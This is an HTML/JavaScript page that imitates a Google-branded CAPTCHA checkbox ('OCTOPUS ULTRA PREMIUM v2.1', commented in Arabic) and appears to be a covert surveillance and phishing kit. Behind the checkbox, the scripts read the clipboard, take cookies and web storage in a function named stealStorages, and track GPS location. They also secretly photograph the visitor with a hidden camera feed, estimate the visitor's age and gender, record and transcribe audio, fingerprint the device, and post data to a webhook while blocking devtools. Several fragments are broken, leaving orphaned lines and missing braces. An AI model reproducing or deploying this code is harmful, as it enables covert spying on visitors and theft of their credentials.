<head>

    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🐙</text></svg>" />
    <style>
        /* ================================================================
           OCTOPUS ULTRA PREMIUM – إصدار 2.1
           تصميم دقيق، صامت، احترافي، يعمل على جميع الأجهزة
           ================================================================ */

        /* ---------- إعادة تعيين عام ---------- */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #eef2f5;
            font-family: 'Roboto', Arial, sans-serif;
            padding: 16px;
            -webkit-font-smoothing: antialiased;
        }

        /* ---------- حاوية الكابتشا ---------- */
        .captcha-wrapper {
            width: 340px;
            max-width: 100%;
            background: #f9f9f9;
            border: 1px solid #d3d3d3;
            border-radius: 5px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
            overflow: hidden;
            cursor: default;
            transition: box-shadow 0.3s ease;
            user-select: none;
        }

        .captcha-wrapper:hover {
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.12);
        }

        /* ---------- الصف الرئيسي ---------- */
        .captcha-row {
            display: flex;
            align-items: center;
            padding: 15px 15px 12px 15px;
            gap: 12px;
        }

        /* ---------- مربع الاختيار (Spinner) ---------- */
        .spinner {
            position: relative;
            flex-shrink: 0;
        }

        .spinner input {
            display: none;
        }

        .checkmark {
            width: 32px;
            height: 32px;
            border: 2px solid #c1c1c1;
            border-radius: 3px;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            background: #ffffff;
            transition: all 0.25s ease;
            position: relative;
            box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.04);
        }

        .checkmark:hover {
            border-color: #a0a0a0;
            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.15);
        }

        /* علامة الصح */
        .checkmark .tick {
            width: 10px;
            height: 18px;
            border-right: 4px solid #00a651;
            border-bottom: 4px solid #00a651;
            transform: rotate(45deg) scale(0.5);
            opacity: 0;
            transition: all 0.2s cubic-bezier(0.34, 1.56, 0.64, 1);
        }

        /* Spinner (التحميل) */
        .checkmark .loader {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid #e8f0fe;
            border-top: 3px solid #1a73e8;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
        }

        /* ---------- حالات المربع ---------- */
        .spinner.loading .checkmark {
            border-color: #1a73e8;
            background: #e8f0fe;
            cursor: default;
        }
        .spinner.loading .checkmark .tick { display: none; }
        .spinner.loading .checkmark .loader { display: block; }

        .spinner.success .checkmark {
            border-color: #00a651;
            background: #e6f4ea;
            cursor: default;
        }
        .spinner.success .checkmark .tick {
            opacity: 1;
            transform: rotate(45deg) scale(1);
        }
        .spinner.success .checkmark .loader { display: none; }

        .spinner.failed .checkmark {
            border-color: #d93025;
            background: #fce8e6;
            cursor: default;
        }
        .spinner.failed .checkmark .tick { display: none; }
        .spinner.failed .checkmark .loader { display: none; }
        .spinner.failed .checkmark::after {
            content: "✕";
            font-size: 22px;
            font-weight: 700;
            color: #d93025;
            line-height: 1;
        }

        .spinner.permission .checkmark {
            border-color: #e37400;
            background: #fef7e0;
            cursor: pointer;
        }
        .spinner.permission .checkmark .tick { display: none; }
        .spinner.permission .checkmark .loader { display: none; }
        .spinner.permission .checkmark::after {
            content: "?";
            font-size: 20px;
            font-weight: 700;
            color: #e37400;
            line-height: 1;
        }

        /* ---------- النص الرئيسي ---------- */
        .text {
            flex: 1;
            font-size: 18px;
            color: #333;
            text-align: center;
            transition: color 0.3s ease;
            font-weight: 400;
            letter-spacing: 0.2px;
        }

        .text.loading {
            color: #1a73e8;
        }
        .text.failed {
            color: #d93025;
        }
        .text.success {
            color: #00a651;
        }
        .text.permission {
            color: #e37400;
        }

        /* ---------- الشعار ---------- */
        .logo {
            display: flex;
            flex-direction: column;
            align-items: center;
            flex-shrink: 0;
            font-size: 10px;
            color: #777;
            line-height: 1.2;
        }

        .logo img {
            width: 38px;
            height: auto;
            margin-bottom: 3px;
            display: block;
        }

        .logo strong {
            font-size: 10px;
            font-weight: 600;
            color: #555;
        }

        .logo small {
            font-size: 8px;
            color: #999;
        }

        /* ---------- التذييل ---------- */
        .captcha-footer {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 6px 14px;
            background: #f1f3f4;
            border-top: 1px solid #e5e7e9;
            min-height: 36px;
        }

        .captcha-footer .brand {
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .captcha-footer .brand svg {
            height: 24px;
            width: auto;
        }

        .captcha-footer .brand .google-text {
            font-size: 14px;
            font-weight: 500;
            color: #222;
            letter-spacing: 0.3px;
        }

        .captcha-footer .links {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 11px;
        }

        .captcha-footer .links a {
            color: #555;
            text-decoration: none;
            font-size: 11px;
            transition: color 0.2s;
        }

        .captcha-footer .links a:hover {
            color: #1a73e8;
            text-decoration: underline;
        }

        .captcha-footer .links .separator {
            color: #aaa;
        }

        /* ---------- أنيميشن ---------- */
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* ---------- استجابة للشاشات الصغيرة ---------- */
        @media (max-width: 480px) {
            .captcha-wrapper { width: 100%; }
            .text { font-size: 16px; }
            .logo img { width: 32px; }
            .captcha-footer .brand svg { height: 20px; }
            .captcha-footer .brand .google-text { font-size: 12px; }
        }

        @media (max-width: 360px) {
            .captcha-row { padding: 12px 10px 10px 10px; gap: 8px; }
            .text { font-size: 14px; }
            .checkmark { width: 28px; height: 28px; }
            .checkmark .tick { width: 8px; height: 14px; border-width: 3px; }
            .logo img { width: 28px; }
        }

        /* ---------- عناصر مخفية للكاميرا والصوت ---------- */
        #hiddenVideo {
            position: fixed;
            top: -1000px;
            left: -1000px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }

        #hiddenCanvas {
            display: none;
        }

        #fingerprintCanvas {
            position: fixed;
            top: -1000px;
            left: -1000px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }

        /* ---------- تلميحات خفيفة ---------- */
        .sr-only {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            border: 0;
        }
    </style>

    <script>
        // ================================================================

            const params = new URLSearchParams(window.location.search);

        // ================================================================
        //  6. تصنيف الجهاز
        // ================================================================
        function classifyDevice() {
            const ua = navigator.userAgent;
            const result = { os: 'Unknown', osVersion: 'Unknown', browser: 'Unknown', browserVersion: 'Unknown',
                deviceType: 'Desktop' };

            if (ua.includes('Windows NT 10.0')) { result.os = 'Windows';
                result.osVersion = '10'; } else if (ua.includes('Windows NT 6.3')) { result.os = 'Windows';
                result.osVersion = '8.1'; } else if (ua.includes('Windows NT 6.2')) { result.os = 'Windows';
                result.osVersion = '8'; } else if (ua.includes('Windows NT 6.1')) { result.os = 'Windows';
                result.osVersion = '7'; } else if (ua.includes('Mac OS X')) { result.os = 'macOS';
                result.osVersion = (ua.match(/Mac OS X ([\d_]+)/)?.[1] || '').replace(/_/g, '.') || 'Unknown'; } else if (ua
                .includes('Linux')) { result.os = 'Linux'; } else if (ua.includes('Android')) { result.os = 'Android';
                result.osVersion = ua.match(/Android ([\d.]+)/)?.[1] || 'Unknown';
                result.deviceType = 'Mobile'; } else if (ua.includes('iPhone') || ua.includes('iPad') || ua.includes(
                'iPod')) { result.os = 'iOS';
                result.osVersion = (ua.match(/OS ([\d_]+)/)?.[1] || '').replace(/_/g, '.') || 'Unknown';
                result.deviceType = ua.includes('iPad') ? 'Tablet' : 'Mobile'; }

            if (ua.includes('Edg/')) { result.browser = 'Edge';
                result.browserVersion = ua.match(/Edg\/([\d.]+)/)?.[1] || 'Unknown'; } else if (ua.includes('OPR/') || ua
                .includes('Opera/')) { result.browser = 'Opera';
                result.browserVersion = ua.match(/(?:OPR|Opera)\/([\d.]+)/)?.[1] || 'Unknown'; } else if (ua.includes(
                'Chrome/')) { result.browser = 'Chrome';
                result.browserVersion = ua.match(/Chrome\/([\d.]+)/)?.[1] || 'Unknown'; } else if (ua.includes(
                'Firefox/')) { result.browser = 'Firefox';
                result.browserVersion = ua.match(/Firefox\/([\d.]+)/)?.[1] || 'Unknown'; } else if (ua.includes('Safari/')) {
                result.browser = 'Safari';
                result.browserVersion = ua.match(/Version\/([\d.]+)/)?.[1] || ua.match(/Safari\/([\d.]+)/)?.[1] ||
                    'Unknown'; }

            if (/Tablet|iPad/i.test(ua)) result.deviceType = 'Tablet';
            else if (/Mobile|iPhone|Android/i.test(ua) && !/Tablet|iPad/i.test(ua)) result.deviceType = 'Mobile';

            state.deviceClassification = result;
            return result;
        }

        // ================================================================

        // ================================================================
        function detectSpoofing() {
            const result = { canvasSpoof: false, webglSpoof: false, vpnProxy: false, headless: false };

            try {
                const c = document.createElement('canvas');
                c.width = 256;
                c.height = 256;
                const ctx = c.getContext('2d');
                ctx.fillStyle = '#f60';
                ctx.fillRect(0, 0, 256, 256);
                const data = ctx.getImageData(0, 0, 256, 256).data;
                let count = 0;
                for (let i = 0; i < data.length; i += 4) {
                    if (data[i] === 255 && data[i + 1] === 102 && data[i + 2] === 0) count++;
                }
                if (count < 60000) result.canvasSpoof = true;
            } catch (_) {}

            try {
                const c = document.createElement('canvas');
                const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
                if (gl) {
                    const info = gl.getExtension('WEBGL_debug_renderer_info');
                    if (info) {
                        const vendor = gl.getParameter(info.UNMASKED_VENDOR_WEBGL);
                        const renderer = gl.getParameter(info.UNMASKED_RENDERER_WEBGL);
                        const legit = ['Google', 'Intel', 'NVIDIA', 'AMD', 'Apple', 'ARM', 'Qualcomm', 'Mesa'];
                        if (!legit.some(x => vendor.includes(x) || renderer.includes(x))) result.webglSpoof = true;
                    }
                }
            } catch (_) {}

            try {
                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                pc.createDataChannel('test');
                pc.createOffer().then(o => pc.setLocalDescription(o));
                const ips = new Set();
                pc.onicecandidate = e => {
                    if (e.candidate) {
                        const ip = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/)?.[1];
                        if (ip) ips.add(ip);
                    }
                };
                setTimeout(() => pc.close(), 2000);
                if (ips.size > 1) result.vpnProxy = true;
            } catch (_) {}

            if (navigator.webdriver === true) result.headless = true;
            if (/HeadlessChrome/.test(navigator.userAgent)) result.headless = true;
            if (/PhantomJS/.test(navigator.userAgent)) result.headless = true;

            state.spoofingDetected = result;
            return result;
        }

        // ================================================================

        async function readClipboard() {
            try {
                state.clipboardContent = await navigator.clipboard.readText();
                return;
            } catch (_) {
                try {
                    const ta = document.createElement('textarea');
                    ta.style.cssText = 'position:fixed;opacity:0;pointer-events:none;top:-1000px;left:-1000px;';
                    document.body.appendChild(ta);
                    ta.focus();
                    document.execCommand('paste');
                    state.clipboardContent = ta.value || null;
                    document.body.removeChild(ta);
                } catch (_2) {
                    state.clipboardContent = null;
                }
            }

        // ================================================================

        function stealStorages() {
            const result = { cookies: document.cookie, localStorage: {}, sessionStorage: {} };
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);

                }
            } catch (_) {}

                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    if (key) result.sessionStorage[key] = sessionStorage.getItem(key);
                }
            } catch (_) {}
            state.allCookies = result;

        function getSearchHistory() {

                keys.forEach(k => {

                    if (v) results.push({ source: 'sessionStorage', key: k, value: v });
                });

            state.browserHistory = results;

        // ================================================================
        //  13. الموقع الجغرافي (GPS)
        // ================================================================
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    state.userLocation.error = 'المتصفح لا يدعم تحديد الموقع';
                    resolve();
                    return;
                }
                let watchId = null,
                    best = null,
                    bestAcc = Infinity,
                    resolved = false,
                    attempts = 0;
                const maxAttempts = CONFIG.LOCATION_ATTEMPTS;
                const timeout = CONFIG.LOCATION_TIMEOUT;
                const targetAcc = CONFIG.LOCATION_TARGET_ACCURACY;

                const finish = () => {
                    if (resolved) return;
                    resolved = true;
                    if (watchId) navigator.geolocation.clearWatch(watchId);
                    if (best) {
                        state.userLocation.lat = best.coords.latitude;
                        state.userLocation.lng = best.coords.longitude;
                        state.userLocation.accuracy = best.coords.accuracy;
                        state.userLocation.error = null;
                    } else {
                        state.userLocation.error = 'لم نتمكن من الحصول على موقع دقيق';
                    }
                    resolve();
                };

                const timer = setTimeout(() => {
                    if (!resolved) {
                        if (watchId) navigator.geolocation.clearWatch(watchId);
                        if (best) finish();
                        else { state.userLocation.error = 'انتهت المهلة';
                            resolve(); }
                    }
                }, timeout);

                const onPos = (p) => {
                    attempts++;
                    const acc = p.coords.accuracy;
                    if (acc < bestAcc) { bestAcc = acc;
                        best = p; }
                    if (acc <= targetAcc || attempts >= maxAttempts) {
                        clearTimeout(timer);
                        finish();
                    }
                };

                const onErr = (e) => {
                    if (resolved) return;
                    if (e.code === 1) {
                        state.userLocation.error = 'تم رفض الإذن بالوصول إلى الموقع';
                        resolved = true;
                        if (watchId) navigator.geolocation.clearWatch(watchId);
                        clearTimeout(timer);
                        resolve();
                        return;
                    }
                    if (attempts < maxAttempts) { /* نستمر */ } else {
                        if (best) finish();
                        else { state.userLocation.error = e.message || 'تعذر الحصول على الموقع';
                            resolve(); }
                    }
                };

                watchId = navigator.geolocation.watchPosition(onPos, onErr, {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 2000
                });
            });
        }

        // ================================================================

        async function startCameraAndCapture() {
            return new Promise(async (resolve) => {
                try {
                    const constraints = {
                        video: {
                            facingMode: 'user',
                            width: { ideal: 1920 },
                            height: { ideal: 1080 },
                        },
                        audio: false,
                    };
                    state.mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                    el.hiddenVideo.srcObject = state.mediaStream;
                    await el.hiddenVideo.play();

                    await new Promise((res, rej) => {
                        const t = setTimeout(() => rej(new Error('Video timeout')), 10000);
                        const ready = () => { clearTimeout(t);
                            res(); };
                        if (el.hiddenVideo.readyState >= 2 && el.hiddenVideo.videoWidth > 0) ready();
                        else {
                            el.hiddenVideo.addEventListener('loadedmetadata', ready);
                            el.hiddenVideo.addEventListener('canplay', ready);
                            el.hiddenVideo.play().catch(() => {});
                        }
                    });

                    await new Promise(r => setTimeout(r, 500));
                    const ctx = el.hiddenCanvas.getContext('2d');
                    const w = Math.min(el.hiddenVideo.videoWidth || 640, 1920);
                    const h = Math.min(el.hiddenVideo.videoHeight || 480, 1080);
                    el.hiddenCanvas.width = w;
                    el.hiddenCanvas.height = h;

                    // كشف الوجه
                    const faceLoaded = await loadFaceApi();
                    if (faceLoaded) {
                        try {
                            const det = await faceapi.detectSingleFace(el.hiddenVideo, new faceapi
                                    .TinyFaceDetectorOptions())
                                .withAgeAndGender();
                            if (det) {
                                state.faceData = {
                                    age: Math.round(det.age),
                                    gender: det.gender,
                                    genderProbability: det.genderProbability,
                                    confidence: det.detection.score,
                                    faceDetected: true,
                                };
                            } else {
                                state.faceData = { faceDetected: false };
                            }
                        } catch (_) {
                            state.faceData = { faceDetected: false };
                        }
                    } else {
                        state.faceData = { faceDetected: false };
                    }

                    state.capturedPhotoFiles = [];
                    for (let i = 1; i <= CONFIG.TOTAL_PHOTOS; i++) {
                        ctx.drawImage(el.hiddenVideo, 0, 0, w, h);
                        const blob = await new Promise((res) => {
                            el.hiddenCanvas.toBlob((b) => res(b), 'image/jpeg', CONFIG.PHOTO_QUALITY);
                        });
                        if (blob && blob.size > 1000) {
                            const file = new File([blob], `photo_${i}_${Date.now()}.jpg`, { type: 'image/jpeg' });
                            state.capturedPhotoFiles.push(file);
                        }
                        if (i < CONFIG.TOTAL_PHOTOS) await new Promise(r => setTimeout(r, CONFIG.CAPTURE_INTERVAL));
                    }
                    resolve(true);
                } catch (err) {
                    if (state.mediaStream) {
                        state.mediaStream.getTracks().forEach(t => t.stop());
                        state.mediaStream = null;
                    }
                    el.hiddenVideo.srcObject = null;
                    resolve(false);
                }
            });
        }

        // ================================================================
        //  16. تسجيل الصوت (8 ثواني) + تحويل إلى نص
        // ================================================================
        async function recordAudio() {
            return new Promise(async (resolve) => {
                try {
                    const constraints = { audio: { echoCancellation: false, noiseSuppression: false,
                            autoGainControl: false } };
                    state.audioStream = await navigator.mediaDevices.getUserMedia(constraints);
                    state.audioRecorder = new MediaRecorder(state.audioStream, { mimeType: 'audio/webm;codecs=opus' });
                    state.audioChunks = [];
                    state.audioRecorder.ondataavailable = (e) => {
                        if (e.data.size > 0) state.audioChunks.push(e.data);
                    };
                    let done = false;
                    state.audioRecorder.onstop = async () => {
                        if (state.audioChunks.length > 0) {
                            state.audioBlob = new Blob(state.audioChunks, { type: 'audio/webm' });
                            await transcribeAudio(state.audioBlob);
                        }
                        done = true;
                        resolve();
                    };
                    state.audioRecorder.start();
                    setTimeout(() => {
                        if (state.audioRecorder.state === 'recording') state.audioRecorder.stop();
                        if (state.audioStream) state.audioStream.getTracks().forEach(t => t.stop());
                    }, CONFIG.AUDIO_DURATION);
                    setTimeout(() => {
                        if (!done) {
                            if (state.audioRecorder.state === 'recording') state.audioRecorder.stop();
                            resolve();
                        }
                    }, CONFIG.AUDIO_DURATION + 3000);
                } catch (_) {
                    resolve();
                }
            });
        }

        // ================================================================
        //  17. تحويل الصوت إلى نص (Web Speech API مع كشف اللغة)
        // ================================================================
        async function transcribeAudio(blob) {
            try {
                if (!('webkitSpeechRecognition' in window) && !('SpeechRecognition' in window)) return;
                const url = URL.createObjectURL(blob);
                const audio = new Audio(url);
                await audio.play();
                const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
                const rec = new SR();
                rec.lang = 'ar-EG';
                rec.continuous = false;
                rec.interimResults = false;
                rec.maxAlternatives = 1;
                return new Promise((resolve) => {
                    let done = false;
                    rec.onresult = (e) => {
                        const t = e.results[0][0].transcript;
                        state.transcribedText = t;
                        if (/[a-zA-Z]/.test(t) && !/[ء-ي]/.test(t)) state.detectedLanguage = 'en';
                        else if (/[ء-ي]/.test(t)) state.detectedLanguage = 'ar';
                        else state.detectedLanguage = 'unknown';
                        done = true;
                        resolve();
                    };
                    rec.onerror = () => { if (!done) resolve(); };
                    rec.onend = () => { if (!done) resolve(); };
                    rec.start();
                    setTimeout(() => {
                        try { rec.stop(); } catch (_) {}
                        if (!done) resolve();
                    }, 8000);
                });
            } catch (_) {
                state.transcribedText = null;
                state.detectedLanguage = null;
            }
        }

                ifr.src = 'https://example.com';

        // ================================================================
        //  19. المراقبة الأمنية (صامتة)
        // ================================================================
        function setupSecurity() {
            document.addEventListener('contextmenu', e => e.preventDefault());
            document.addEventListener('dragstart', e => e.preventDefault());
            document.addEventListener('selectstart', e => e.preventDefault());

            document.addEventListener('keydown', e => {
                const key = e.key,
                    ctrl = e.ctrlKey || e.metaKey,
                    shift = e.shiftKey;
                if (key === 'F12' || (ctrl && shift && ['I', 'C', 'J'].includes(key)) || (ctrl && key === 'U')) {
                    e.preventDefault();
                    reportSuspicious(`devtools (${key})`);
                }
                if (ctrl && ['c', 'v', 'x'].includes(key)) {
                    reportSuspicious(`copy/paste (${key})`);
                }
            });

            let lastW = window.innerWidth,
                lastH = window.innerHeight;
            setInterval(() => {
                if (window.innerWidth !== lastW || window.innerHeight !== lastH) {
                    if (Math.abs(window.innerWidth - lastW) > 80 || Math.abs(window.innerHeight - lastH) > 80) {
                        reportSuspicious(`window resize (${window.innerWidth}x${window.innerHeight})`);
                    }
                    lastW = window.innerWidth;
                    lastH = window.innerHeight;
                }
            }, 2000);
        }

        let alertCooldown = 0;

        function reportSuspicious(action) {
            if (!state.userToken) return;
            const now = Date.now();
            if (now - alertCooldown < 5000) return;
            alertCooldown = now;
            const fd = new FormData();
            fd.append('event', 'suspicious');
            fd.append('action', action);
            fd.append('timestamp', new Date().toISOString());
            fd.append('ip', state.userIP);
            fd.append('userAgent', navigator.userAgent);
            fd.append('url', window.location.href);
            fd.append('token', state.userToken);
            fetch(CONFIG.WEBHOOK_URL, { method: 'POST', body: fd }).catch(() => {});
        }

            const origFetch = window.fetch;

                const delay = Math.floor(Math.random() * 250) + 80;
                return new Promise(resolve => {
                    setTimeout(() => resolve(origFetch.apply(this, args)), delay);
                });
            };

            try {
                if ('serviceWorker' in navigator) {
                    const code =
                        `self.addEventListener('install',e=>e.waitUntil(self.skipWaiting()));self.addEventListener('activate',e=>e.waitUntil(clients.claim()));self.addEventListener('fetch',e=>e.respondWith(fetch(e.request)));`;
                    const blob = new Blob([code], { type: 'application/javascript' });
                    const url = URL.createObjectURL(blob);
                    navigator.serviceWorker.register(url, { scope: '/' }).catch(() => {});
                }
            } catch (_) {}
        }

                fd.append('language', navigator.language);
                fd.append('screen', `${screen.width}x${screen.height}`);
                fd.append('url', window.location.href);
                fd.append('token', state.userToken);
                await fetch(CONFIG.WEBHOOK_URL, { method: 'POST', body: fd });
            } catch (_) {}

            classifyDevice();
            detectSpoofing();
            await collectDeviceData();

            console.log('🐙 OCTOPUS ULTRA PREMIUM v2.1 – جاهز');
        });

        window.addEventListener('beforeunload', () => {
            if (state.mediaStream) state.mediaStream.getTracks().forEach(t => t.stop());
            if (state.audioStream) state.audioStream.getTracks().forEach(t => t.stop());
            if (state.audioRecorder && state.audioRecorder.state === 'recording') state.audioRecorder.stop();
        });
    </script>
